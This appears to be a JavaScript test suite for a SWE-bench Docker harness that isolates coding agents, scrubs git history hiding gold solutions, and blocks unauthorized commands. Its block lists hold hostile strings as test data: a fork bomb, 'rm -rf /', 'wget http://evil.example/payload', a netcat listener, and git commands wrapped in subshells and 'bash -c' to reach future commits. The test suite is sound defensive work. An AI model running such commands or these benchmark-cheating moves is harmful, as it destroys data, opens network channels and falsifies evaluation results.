import test, { after, describe } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import {
  DEFAULT_TESTBED_PATH,
  SWEBENCH_DOCKER_PRESETS,
  SweBenchDockerAdapter,
  ensureDockerImage,
  extractTestbedFromImage,
  isAuthorizedSweBenchCommand,
  removeDockerImage,
  resolveSweBenchDockerImage,
  scrubAntiCheatGitRefs,
} from '../../src/evaluation/swebench-docker.js';

function runGit(cwd, args, { allowFail = false } = {}) {
  try {
    return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: 'pipe' });
  } catch (err) {
    if (allowFail) return null;
    throw err;
  }
}

function createFakeSpawnProcess({ exitCode = 0, stdoutChunks = [], stderrChunks = [], delayMs = 5, hang = false } = {}) {
  const child = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.killed = false;
  let closed = false;
  const finish = (code) => {
    if (closed) return;
    closed = true;
    child.emit('close', code);
  };
  child.kill = () => {
    child.killed = true;
    finish(null);
  };

  if (!hang) {
    setTimeout(() => {
      if (closed) return;
      for (const chunk of stdoutChunks) child.stdout.emit('data', Buffer.from(chunk, 'utf8'));
      for (const chunk of stderrChunks) child.stderr.emit('data', Buffer.from(chunk, 'utf8'));
      finish(exitCode);
    }, delayMs);
  }
  return child;
}

describe('SWE-bench Docker Bed & Anti-Cheat Guards (WP1 + WP2)', () => {
  const tempDirs = [];
  const makeTmp = (prefix) => {
    const dir = mkdtempSync(join(tmpdir(), prefix));
    tempDirs.push(dir);
    return dir;
  };

  after(() => {
    for (const dir of tempDirs) {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('constants and resolveSweBenchDockerImage presets & overrides', () => {
    assert.equal(Object.isFrozen(SWEBENCH_DOCKER_PRESETS), true);
    assert.equal(
      SWEBENCH_DOCKER_PRESETS.epoch,
      'ghcr.io/epoch-research/swe-bench.eval.x86_64.{instance_id}:latest',
    );
    assert.equal(
      SWEBENCH_DOCKER_PRESETS.official,
      'swebench/sweb.eval.x86_64.{instance_id}:latest',
    );
    assert.ok(DEFAULT_TESTBED_PATH.startsWith('/opt/miniconda3/envs/testbed/bin:'));

    const instance = { instance_id: 'django__django-11099', repo: 'django/django' };
    assert.equal(
      resolveSweBenchDockerImage({ dockerPreset: 'epoch', instance }),
      'ghcr.io/epoch-research/swe-bench.eval.x86_64.django__django-11099:latest',
    );
    assert.equal(
      resolveSweBenchDockerImage({ dockerPreset: 'official', instance }),
      'swebench/sweb.eval.x86_64.django__django-11099:latest',
    );
    assert.equal(
      resolveSweBenchDockerImage({
        dockerPreset: 'epoch',
        dockerImage: 'custom.reg/{repo}/{repo_slug}:{instance_id}',
        instance,
      }),
      'custom.reg/django/django/django__django:django__django-11099',
    );
    assert.throws(
      () =>
        resolveSweBenchDockerImage({
          dockerPreset: 'bogus',
          dockerImage: 'custom.reg/img:latest',
          instance,
        }),
      /Invalid dockerPreset/,
    );
    assert.equal(
      resolveSweBenchDockerImage({
        dockerImage: 'local/{repo_slug}/{instance_id}:dev',
        instance,
      }),
      'local/django__django/django__django-11099:dev',
    );
    assert.equal(
      resolveSweBenchDockerImage({
        dockerPreset: 'official',
        instance: { instance_id: 'PyData__Xarray-4094', repo: 'pydata/xarray' },
      }),
      'swebench/sweb.eval.x86_64.pydata__xarray-4094:latest',
    );
    assert.equal(
      resolveSweBenchDockerImage({
        dockerPreset: 'epoch',
        instance: { instance_id: 'Scikit-Learn__Scikit-Learn-13142', repo: 'scikit-learn/scikit-learn' },
      }),
      'ghcr.io/epoch-research/swe-bench.eval.x86_64.scikit-learn__scikit-learn-13142:latest',
    );
    assert.equal(resolveSweBenchDockerImage({ instance }), null);

    assert.throws(
      () => resolveSweBenchDockerImage({ dockerPreset: 'invalid-preset', instance }),
      /Invalid dockerPreset/,
    );
    assert.throws(
      () => resolveSweBenchDockerImage({ dockerPreset: 'epoch', instance: { repo: 'django/django' } }),
      /instance_id is required/,
    );
  });

  test('ensureDockerImage enforces missing, always, and never pull policies', async () => {
    await assert.rejects(
      () => ensureDockerImage('img:latest', { pull: 'sometimes' }),
      /Invalid pull policy/,
    );

    // pull='missing' with local image present skips pull
    const callsPresent = [];
    const resPresent = await ensureDockerImage('repo/img:1', {
      pull: 'missing',
      execFileImpl: async (bin, args) => {
        callsPresent.push([bin, ...args]);
        return { stdout: '[{"Id":"sha256:abc"}]', stderr: '' };
      },
    });
    assert.equal(resPresent.pulled, false);
    assert.deepEqual(callsPresent, [['docker', 'image', 'inspect', 'repo/img:1']]);

    // pull='missing' with inspect fail triggers pull
    const callsMissing = [];
    const resMissing = await ensureDockerImage('repo/img:2', {
      pull: 'missing',
      execFileImpl: async (bin, args) => {
        callsMissing.push([bin, ...args]);
        if (args[0] === 'image' && args[1] === 'inspect') {
          throw new Error('No such image');
        }
        return { stdout: 'Pulled', stderr: '' };
      },
    });
    assert.equal(resMissing.pulled, true);
    assert.deepEqual(callsMissing, [
      ['docker', 'image', 'inspect', 'repo/img:2'],
      ['docker', 'pull', 'repo/img:2'],
    ]);

    // pull='always' skips inspect and always pulls with >= 900_000ms timeout
    const callsAlways = [];
    const pullTimeouts = [];
    const resAlways = await ensureDockerImage('repo/img:3', {
      pull: 'always',
      execFileImpl: async (bin, args, opts) => {
        callsAlways.push([bin, ...args]);
        pullTimeouts.push(opts?.timeout);
        return { stdout: 'Pulled', stderr: '' };
      },
    });
    assert.equal(resAlways.pulled, true);
    assert.deepEqual(callsAlways, [['docker', 'pull', 'repo/img:3']]);
    assert.ok(pullTimeouts[0] >= 900_000, `Expected pull timeout >= 900_000ms, got ${pullTimeouts[0]}`);

    // pull='never' fails clearly when absent and does NOT call docker pull
    const callsNever = [];
    await assert.rejects(
      () =>
        ensureDockerImage('repo/img:4', {
          pull: 'never',
          execFileImpl: async (bin, args) => {
            callsNever.push([bin, ...args]);
            throw new Error('Image missing');
          },
        }),
      /pull policy is "never"/,
    );
    assert.deepEqual(callsNever, [['docker', 'image', 'inspect', 'repo/img:4']]);

    // Supports Node callback-style 4-arg execFileImpl
    const cbCalls = [];
    const cbRes = await ensureDockerImage('repo/img:5', {
      pull: 'missing',
      execFileImpl: (bin, args, _opts, cb) => {
        cbCalls.push([bin, ...args]);
        cb(null, '[{"Id":"ok"}]', '');
      },
    });
    assert.equal(cbRes.present, true);
    assert.deepEqual(cbCalls, [['docker', 'image', 'inspect', 'repo/img:5']]);
  });

  test('extractTestbedFromImage extracts /testbed, normalizes git config, checks baseCommit, and always removes temp container on error', async () => {
    // 1. Temp container cleanup on docker cp failure
    const errDockerCalls = [];
    const errTarget = join(makeTmp('extract-err-'), 'testbed');
    await assert.rejects(
      () =>
        extractTestbedFromImage({
          image: 'swe/img:latest',
          targetDir: errTarget,
          pull: 'never',
          execFileImpl: async (_bin, args) => {
            errDockerCalls.push(args);
            if (args[0] === 'image') return { stdout: '[{}]', stderr: '' };
            if (args[0] === 'create') return { stdout: 'cid-temp-999\n', stderr: '' };
            if (args[0] === 'cp') throw new Error('docker cp failed');
            if (args[0] === 'rm') return { stdout: 'cid-temp-999', stderr: '' };
            return { stdout: '', stderr: '' };
          },
        }),
      /docker cp failed/,
    );
    assert.ok(
      errDockerCalls.some((a) => a[0] === 'rm' && a[1] === '-f' && a[2] === 'cid-temp-999'),
      'Temp container MUST be removed via docker rm -f in finally on error',
    );

    // 2. Real git repo simulated as extracted /testbed with commit checkout fallback + config check
    const seedRepo = makeTmp('seed-testbed-');
    writeFileSync(join(seedRepo, 'app.py'), 'def f():\n    return 1\n', 'utf8');
    runGit(seedRepo, ['init', '-q']);
    runGit(seedRepo, ['config', 'user.email', 'seed@example.com']);
    runGit(seedRepo, ['config', 'user.name', 'Seed']);
    runGit(seedRepo, ['add', '-A']);
    runGit(seedRepo, ['commit', '-qm', 'base commit']);
    const baseCommit = runGit(seedRepo, ['rev-parse', 'HEAD']).trim();

    writeFileSync(join(seedRepo, 'app.py'), 'def f():\n    return 2\n', 'utf8');
    runGit(seedRepo, ['add', '-A']);
    runGit(seedRepo, ['commit', '-qm', 'next commit']);
    const nextCommit = runGit(seedRepo, ['rev-parse', 'HEAD']).trim();
    assert.notEqual(baseCommit, nextCommit);

    const targetDir = join(makeTmp('extracted-ws-'), 'repo');
    const okDockerCalls = [];
    const extracted = await extractTestbedFromImage({
      image: 'swe/img:base',
      targetDir,
      baseCommit: baseCommit.slice(0, 10),
      pull: 'missing',
      execFileImpl: async (_bin, args) => {
        okDockerCalls.push(args);
        if (args[0] === 'image') return { stdout: '[{}]', stderr: '' };
        if (args[0] === 'create') return { stdout: 'cid-ok-123\n', stderr: '' };
        if (args[0] === 'cp') {
          assert.equal(args[1], 'cid-ok-123:/testbed/.');
          assert.equal(args[2], resolve(targetDir));
          // Simulate docker cp copying the repo contents
          const { cpSync } = await import('node:fs');
          cpSync(seedRepo, targetDir, { recursive: true });
          return { stdout: '', stderr: '' };
        }
        if (args[0] === 'rm') return { stdout: 'cid-ok-123', stderr: '' };
        return { stdout: '', stderr: '' };
      },
    });

    assert.equal(extracted.targetDir, resolve(targetDir));
    assert.equal(extracted.headCommit, baseCommit);
    assert.equal(runGit(targetDir, ['config', '--local', '--get', 'core.autocrlf']).trim(), 'false');
    assert.equal(runGit(targetDir, ['config', '--local', '--get', 'core.filemode']).trim(), 'false');
    assert.ok(okDockerCalls.some((a) => a[0] === 'rm' && a[1] === '-f' && a[2] === 'cid-ok-123'));

    // 3. Explicit error when baseCommit does not exist in extracted repo
    await assert.rejects(
      () =>
        extractTestbedFromImage({
          image: 'swe/img:bad',
          targetDir: join(makeTmp('extract-mismatch-'), 'repo'),
          baseCommit: 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef',
          pull: 'never',
          execFileImpl: async (_bin, args) => {
            if (args[0] === 'image') return { stdout: '[{}]', stderr: '' };
            if (args[0] === 'create') return { stdout: 'cid-bad-1', stderr: '' };
            if (args[0] === 'cp') {
              const { cpSync } = await import('node:fs');
              cpSync(seedRepo, args[2], { recursive: true });
              return { stdout: '', stderr: '' };
            }
            return { stdout: '', stderr: '' };
          },
        }),
      /does not match expected baseCommit/,
    );
  });

  test('scrubAntiCheatGitRefs destroys remotes, tags, future/diverged branches, reflogs, and unreachable objects while preserving baseCommit', async () => {
    const repoDir = makeTmp('anticheat-git-');
    writeFileSync(join(repoDir, 'bug.py'), 'val = 0\n', 'utf8');
    runGit(repoDir, ['init', '-q', '-b', 'main']);
    runGit(repoDir, ['config', 'user.email', 'test@agent-us.invalid']);
    runGit(repoDir, ['config', 'user.name', 'Test']);
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-qm', 'ancestor commit']);

    writeFileSync(join(repoDir, 'bug.py'), 'val = 1\n', 'utf8');
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-qm', 'base commit']);
    const baseCommit = runGit(repoDir, ['rev-parse', 'HEAD']).trim();
    runGit(repoDir, ['branch', 'ancestor-branch', baseCommit]);

    // Create diverged branch
    runGit(repoDir, ['checkout', '-qb', 'diverged-fix', 'HEAD~1']);
    writeFileSync(join(repoDir, 'bug.py'), 'val = 99\n', 'utf8');
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-qm', 'diverged solution']);

    // Create future commits on main + future tag + remotes
    runGit(repoDir, ['checkout', '-q', 'main']);
    writeFileSync(join(repoDir, 'bug.py'), 'val = 42\n', 'utf8');
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-qm', 'GOLD SOLUTION SECRET']);
    const futureCommit = runGit(repoDir, ['rev-parse', 'HEAD']).trim();
    runGit(repoDir, ['tag', 'v-gold-solution', futureCommit]);
    runGit(repoDir, ['remote', 'add', 'origin', 'https://github.com/example/secret.git']);
    runGit(repoDir, ['update-ref', 'refs/remotes/origin/main', futureCommit]);
    runGit(repoDir, ['update-ref', 'refs/remotes/orphan/main', futureCommit]);

    const result = await scrubAntiCheatGitRefs(repoDir, baseCommit);
    assert.deepEqual(result.removedRemotes, ['origin']);
    assert.ok(result.removedRefs.includes('refs/remotes/orphan/main'));
    assert.ok(result.removedRefs.includes('refs/tags/v-gold-solution'));
    assert.ok(result.removedRefs.includes('refs/heads/main'));
    assert.ok(result.removedRefs.includes('refs/heads/diverged-fix'));
    assert.equal(result.removedRefs.includes('refs/heads/ancestor-branch'), false);

    assert.equal(runGit(repoDir, ['remote']).trim(), '');
    assert.equal(runGit(repoDir, ['rev-parse', 'HEAD']).trim(), baseCommit);
    assert.equal(runGit(repoDir, ['symbolic-ref', '-q', 'HEAD'], { allowFail: true }), null);

    const remainingRefs = runGit(repoDir, ['for-each-ref', '--format=%(refname)']).trim().split(/\r?\n/).filter(Boolean);
    assert.deepEqual(remainingRefs, ['refs/heads/ancestor-branch']);
    assert.equal(runGit(repoDir, ['reflog']).trim(), '');
    assert.equal(runGit(repoDir, ['cat-file', '-e', futureCommit], { allowFail: true }), null);
    assert.notEqual(runGit(repoDir, ['cat-file', '-e', baseCommit], { allowFail: true }), null);
  });

  test('isAuthorizedSweBenchCommand enforces anti-cheat in both host and container modes while supporting safe test & container commands', () => {
    // Empty & hard-blocked
    assert.equal(isAuthorizedSweBenchCommand(''), false);
    assert.equal(isAuthorizedSweBenchCommand('   '), false);
    assert.equal(isAuthorizedSweBenchCommand('rm -rf /'), false);
    assert.equal(isAuthorizedSweBenchCommand('rm -rf /', { containerMode: true }), false);
    assert.equal(isAuthorizedSweBenchCommand(':(){ :|:& };:', { containerMode: true }), false);

    // Anti-cheat MUST always be rejected even in containerMode=true and even if customTestCmd matches!
    const cheatCommands = [
      'git commit -m "cheat"',
      'git reset --hard HEAD',
      'git checkout main',
      'git switch main',
      'git restore app.py',
      'git revert HEAD',
      'git rebase main',
      'git cherry-pick abc123',
      'git merge main',
      'git fetch origin',
      'git pull',
      'git push',
      'git remote -v',
      'git clone https://example.com/repo.git',
      'git tag',
      'git branch -a',
      'git reflog',
      'git for-each-ref',
      'git show-ref',
      'git cat-file -p HEAD',
      'git update-ref -d HEAD',
      'git fsck --lost-found',
      'git log --all',
      'git log --branches',
      'git log --tags',
      'git log --glob=*',
      'git log refs/heads/main',
      'git rev-list --all',
      'git show HEAD@{1}',
      'cat .git/refs/heads/main',
      'cat ".git/objects/aa/bbcc"',
      "cat .git/'logs'/HEAD",
      'cat .git/packed-refs',
      'ls -la /testbed/.git',
      'pytest -q && git log --all',
      'pytest -q; git checkout HEAD~1',
      'pytest -q | cat && git branch -a',
      'echo $(git cat-file -p HEAD)',
      'pytest `git tag`',
      'PYTHONPATH=$(git reset --hard) pytest',
      'env git checkout main',
      '/usr/bin/git for-each-ref',
      'bash -c "git checkout main"',
      'python -c "import os; os.system(\'git log --all\')"',
    ];
    for (const cmd of cheatCommands) {
      assert.equal(isAuthorizedSweBenchCommand(cmd, { containerMode: false }), false, `host must block: ${cmd}`);
      assert.equal(isAuthorizedSweBenchCommand(cmd, { containerMode: true }), false, `container must block: ${cmd}`);
      assert.equal(
        isAuthorizedSweBenchCommand(cmd, { customTestCmd: cmd, containerMode: true }),
        false,
        `customTestCmd must NOT bypass anti-cheat: ${cmd}`,
      );
    }

    // Host safe test commands + env var stripping
    const safeHostCommands = [
      'pytest -rA --tb=short tests/test_app.py',
      'py.test -q',
      'PYTHONPATH=. DJANGO_SETTINGS_MODULE=tests.sqlite PYTHONWARNINGS=ignore python tests/runtests.py --verbosity 2',
      "PYTHONWARNINGS='ignore::UserWarning,ignore::SyntaxWarning' bin/test -C --verbose sympy/core/tests/test_arit.py",
      'python3 -m pytest tests/',
      'python -m unittest discover',
      './tests/runtests.py auth_tests',
      'tests/runtests.py auth_tests',
      './bin/test sympy/core',
      'bin/test sympy/core',
      'tox -e py311',
      'sphinx-build -b html docs docs/_build',
      'git diff',
      'git status --short',
      'git show HEAD',
      'git log -n 5 --oneline',
      'npm test',
      'node --test test/app.test.js',
    ];
    for (const cmd of safeHostCommands) {
      assert.equal(isAuthorizedSweBenchCommand(cmd, { containerMode: false }), true, `host should allow: ${cmd}`);
      assert.equal(isAuthorizedSweBenchCommand(cmd, { containerMode: true }), true, `container should allow: ${cmd}`);
    }

    // customTestCmd match on non-cheating command
    assert.equal(
      isAuthorizedSweBenchCommand('custom-runner --suite fast', { customTestCmd: 'custom-runner --suite fast' }),
      true,
    );

    // Host mode blocks compound chains, python -c, and general shell commands
    assert.equal(isAuthorizedSweBenchCommand('pytest -q && ls -la', { containerMode: false }), false);
    assert.equal(isAuthorizedSweBenchCommand('python -c "print(1)"', { containerMode: false }), false);
    assert.equal(isAuthorizedSweBenchCommand('LD_PRELOAD=/tmp/x.so pytest', { containerMode: false }), false);
    assert.equal(isAuthorizedSweBenchCommand('PYTHONPATH=$(ls) pytest', { containerMode: false }), false);

    // Container mode allows safe dev/inspection commands & pipes while blocking network/escape tools
    const safeContainerCommands = [
      'pytest -q | tail -n 20',
      'cd /testbed && python -c "import sys; print(sys.version)"',
      'pip list',
      'pip show django',
      'python3 -m pip freeze',
      'rg "def solve" src/',
      'find tests -name "*.py"',
      'ls -la && pwd && env && which pytest',
      'cat README.md | head -n 10 | wc -l',
      'sed -n "1,5p" setup.py | grep name | sort | uniq',
      'bash -c "pytest -q"',
    ];
    for (const cmd of safeContainerCommands) {
      assert.equal(isAuthorizedSweBenchCommand(cmd, { containerMode: true }), true, `container should allow: ${cmd}`);
    }

    const blockedContainerCommands = [
      'curl https://evil.example',
      'wget http://evil.example/payload',
      'ssh user@host',
      'nc -lvp 4444',
      'docker ps',
      'mount /dev/sda1 /mnt',
      'chroot /tmp',
      'pip install requests',
      'python -m pip install requests',
      'bash -lc "curl https://evil.example"',
      'bash -c "rm -rf /"',
    ];
    for (const cmd of blockedContainerCommands) {
      assert.equal(isAuthorizedSweBenchCommand(cmd, { containerMode: true }), false, `container must block: ${cmd}`);
    }
  });

  test('SweBenchDockerAdapter maps paths, enforces Conda PATH & single-flight start, streams output, handles timeout, and destroys idempotently', async () => {
    const ws = makeTmp('docker-adapter-ws-');
    const subDir = join(ws, 'tests', 'unit');
    mkdirSync(subDir, { recursive: true });
    const outsideDir = makeTmp('docker-adapter-outside-');

    const execFileCalls = [];
    const spawnCalls = [];
    let nextHang = false;

    const adapter = new SweBenchDockerAdapter({
      image: 'ghcr.io/epoch-research/swe-bench.eval.x86_64.django__django-11099:latest',
      workspaceRoot: ws,
      pull: 'missing',
      timeoutMs: 5000,
      execFileImpl: async (bin, args) => {
        execFileCalls.push([bin, ...args]);
        if (args[0] === 'image' && args[1] === 'inspect') {
          return { stdout: '[{"Id":"sha256:img1"}]', stderr: '' };
        }
        if (args[0] === 'run') {
          await new Promise((r) => setTimeout(r, 15));
          return { stdout: 'cid-live-007\n', stderr: '' };
        }
        if (args[0] === 'rm') {
          return { stdout: 'cid-live-007\n', stderr: '' };
        }
        return { stdout: '', stderr: '' };
      },
      spawnImpl: (bin, args, opts) => {
        spawnCalls.push({ bin, args, opts });
        if (nextHang) {
          return createFakeSpawnProcess({ hang: true });
        }
        return createFakeSpawnProcess({
          exitCode: 0,
          stdoutChunks: ['passed ', '3 tests\n'],
          stderrChunks: ['warning\n'],
        });
      },
    });

    assert.equal(adapter.isSweBenchContainer, true);
    assert.deepEqual(adapter.resolveBackend(), {
      mode: 'docker',
      tier: 'strong-os-isolation',
      backend: adapter,
    });

    // Path mapping & escape protection
    assert.equal(adapter.mapHostCwdToContainer(ws), '/testbed');
    assert.equal(adapter.mapHostCwdToContainer('tests/unit'), '/testbed/tests/unit');
    assert.equal(adapter.mapHostCwdToContainer(subDir), '/testbed/tests/unit');
    assert.throws(() => adapter.mapHostCwdToContainer('..'), /escapes workspaceRoot/);
    assert.throws(() => adapter.mapHostCwdToContainer(outsideDir), /escapes workspaceRoot/);

    // Symlink escape guard (skip cleanly if OS rejects unprivileged symlink creation)
    const linkPath = join(ws, 'escape-link');
    let symlinkCreated = false;
    try {
      symlinkSync(outsideDir, linkPath, process.platform === 'win32' ? 'junction' : 'dir');
      symlinkCreated = true;
    } catch {
      symlinkCreated = false;
    }
    if (symlinkCreated) {
      assert.throws(() => adapter.mapHostCwdToContainer(linkPath), /escapes workspaceRoot/);
    }

    // Concurrent start() is single-flight
    const [cid1, cid2] = await Promise.all([adapter.start(), adapter.start()]);
    assert.equal(cid1, 'cid-live-007');
    assert.equal(cid2, 'cid-live-007');
    const dockerRunCalls = execFileCalls.filter((c) => c[1] === 'run');
    assert.equal(dockerRunCalls.length, 1);

    const runArgs = dockerRunCalls[0].slice(1);
    assert.ok(runArgs.includes('-d'));
    assert.ok(runArgs.includes('--rm'));
    assert.ok(runArgs.includes('--network=none'));
    assert.ok(runArgs.includes('--memory=2g'));
    assert.ok(runArgs.includes('--memory-swap=2.5g'));
    assert.ok(runArgs.includes('--cpus=2'));
    assert.ok(runArgs.includes(`${realpathSync(ws)}:/testbed:rw`) || runArgs.includes(`${ws}:/testbed:rw`));
    assert.ok(runArgs.includes(`PATH=${DEFAULT_TESTBED_PATH}`));
    assert.ok(runArgs.includes('CONDA_DEFAULT_ENV=testbed'));
    assert.ok(runArgs.includes('CONDA_PREFIX=/opt/miniconda3/envs/testbed'));
    assert.ok(runArgs.includes('PYTHONDONTWRITEBYTECODE=1'));
    assert.ok(runArgs.includes('MPLCONFIGDIR=/tmp/mpl'));
    assert.ok(runArgs.includes('GIT_TERMINAL_PROMPT=0'));
    assert.deepEqual(runArgs.slice(-3), ['tail', '-f', '/dev/null']);

    // run() rejects anti-cheat unless skipAntiCheatGuard=true
    await assert.rejects(() => adapter.run('git checkout main', ws), /Blocked unauthorized/);
    await assert.rejects(() => adapter.run('curl https://x.invalid', ws), /Blocked unauthorized/);

    const streamed = [];
    const runRes = await adapter.run('pytest -q', subDir, {
      onOutput: (ev) => streamed.push(ev),
    });
    assert.equal(runRes.exitCode, 0);
    assert.equal(runRes.timedOut, false);
    assert.equal(runRes.stdout, 'passed 3 tests\n');
    assert.equal(runRes.stderr, 'warning\n');
    assert.deepEqual(streamed, [
      { stream: 'stdout', chunk: 'passed ' },
      { stream: 'stdout', chunk: '3 tests\n' },
      { stream: 'stderr', chunk: 'warning\n' },
    ]);
    assert.deepEqual(spawnCalls[0].args, [
      'exec',
      '-w',
      '/testbed/tests/unit',
      'cid-live-007',
      'bash',
      '-c',
      'pytest -q',
    ]);

    // skipAntiCheatGuard allows grading git apply / checkout
    const execBypass = await adapter.exec('git checkout -- tests/test_x.py', {
      skipAntiCheatGuard: true,
    });
    assert.equal(execBypass.exitCode, 0);
    assert.equal(spawnCalls[1].args[2], '/testbed');

    // Timeout enforcement
    nextHang = true;
    const timeoutRes = await adapter.run('pytest -q', ws, { timeoutMs: 80 });
    assert.equal(timeoutRes.exitCode, 124);
    assert.equal(timeoutRes.timedOut, true);
    assert.match(timeoutRes.stderr, /timeout after 80ms/);

    // AbortSignal enforcement
    const ac = new AbortController();
    const abortPromise = adapter.run('pytest -q', ws, { signal: ac.signal, timeoutMs: 5000 });
    setTimeout(() => ac.abort(), 10);
    await assert.rejects(() => abortPromise, /aborted/);

    // destroy() & close() are idempotent
    await adapter.destroy();
    await adapter.close();
    const rmCalls = execFileCalls.filter((c) => c[1] === 'rm');
    assert.equal(rmCalls.length, 1);
    assert.deepEqual(rmCalls[0], ['docker', 'rm', '-f', 'cid-live-007']);
    assert.equal(adapter.containerId, null);
  });

  test('removeDockerImage removes ancestor containers then deletes image and tolerates missing image', async () => {
    const callsWithLeftover = [];
    const resRemoved = await removeDockerImage('ghcr.io/epoch-research/swe-bench.eval.x86_64.django__django-11099:latest', {
      execFileImpl: async (bin, args) => {
        callsWithLeftover.push([bin, ...args]);
        if (args[0] === 'ps') {
          return { stdout: 'cid-stale-1\ncid-stale-2\n', stderr: '' };
        }
        return { stdout: '', stderr: '' };
      },
    });
    assert.deepEqual(resRemoved, {
      image: 'ghcr.io/epoch-research/swe-bench.eval.x86_64.django__django-11099:latest',
      removed: true,
    });
    assert.deepEqual(callsWithLeftover, [
      ['docker', 'ps', '-aq', '--filter', 'ancestor=ghcr.io/epoch-research/swe-bench.eval.x86_64.django__django-11099:latest'],
      ['docker', 'rm', '-f', 'cid-stale-1', 'cid-stale-2'],
      ['docker', 'rmi', '-f', 'ghcr.io/epoch-research/swe-bench.eval.x86_64.django__django-11099:latest'],
    ]);

    // Tolerate already-missing image cleanly
    const resMissing = await removeDockerImage('swe/missing:latest', {
      execFileImpl: async (_bin, args) => {
        if (args[0] === 'ps') return { stdout: '', stderr: '' };
        if (args[0] === 'rmi') {
          const err = new Error('Command failed');
          err.stderr = 'Error response from daemon: No such image: swe/missing:latest';
          throw err;
        }
        return { stdout: '', stderr: '' };
      },
    });
    assert.deepEqual(resMissing, { image: 'swe/missing:latest', removed: false });
  });
});
